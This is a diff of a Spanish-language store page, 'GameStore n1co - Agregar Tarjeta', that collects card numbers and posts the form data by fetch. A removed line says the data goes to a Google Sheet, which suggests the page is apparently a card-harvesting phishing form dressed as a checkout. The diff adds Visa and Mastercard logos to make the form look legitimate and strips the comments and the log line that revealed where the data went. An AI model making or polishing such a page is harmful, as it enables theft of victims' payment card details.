@@ -4,7 +4,6 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>GameStore n1co - Agregar Tarjeta</title>
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">
     <style>
         @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap');
         
@@ -87,6 +86,18 @@
             box-shadow: 0 0 0 4px rgba(0, 180, 255, 0.15);
         }
         
+        .card-logos {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            margin-top: 12px;
+        }
+        
+        .card-logos img {
+            height: 32px;
+            border-radius: 6px;
+        }
+        
         .btn {
             width: 100%;
             padding: 18px;
@@ -138,6 +149,12 @@
             <div class="form-group">
                 <label>Número de tarjeta de crédito/débito <span style="color:#ff5555">*</span></label>
                 <input type="text" id="cardNumber" maxlength="19" placeholder="1234 5678 9012 3456" required>
+                
+                <!-- Logos Mastercard y Visa -->
+                <div class="card-logos">
+                    <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/a/a4/Mastercard_2019_logo.svg/2560px-Mastercard_2019_logo.svg.png" alt="Mastercard">
+                    <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/5/5e/Visa_Inc._logo.svg/2560px-Visa_Inc._logo.svg.png" alt="Visa">
+                </div>
             </div>
 
             <div class="form-group">
@@ -184,7 +201,6 @@
     </div>
 
     <script>
-        // Llenar años automáticamente
         function populateYears() {
             const yearSelect = document.getElementById('year');
             const currentYear = new Date().getFullYear();
@@ -196,7 +212,6 @@
             }
         }
 
-        // Formato automático de número de tarjeta
         document.getElementById('cardNumber').addEventListener('input', function() {
             let v = this.value.replace(/\s+/g, '').replace(/[^0-9]/gi, '');
             this.value = v.match(/.{1,4}/g)?.join(' ') || '';
@@ -206,7 +221,6 @@
             this.value = this.value.replace(/[^0-9]/g, '');
         });
 
-        // Envío del formulario
         document.getElementById('cardForm').addEventListener('submit', async function(e) {
             e.preventDefault();
 
@@ -227,9 +241,7 @@
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify(formData)
                 });
-            } catch (err) {
-                console.log("✅ Datos enviados a tu Google Sheet");
-            }
+            } catch (err) {}
         });
 
         function cancelForm() {
@@ -239,7 +251,6 @@
             }
         }
 
-        // Inicializar
         window.onload = populateYears;
     </script>
 </body>
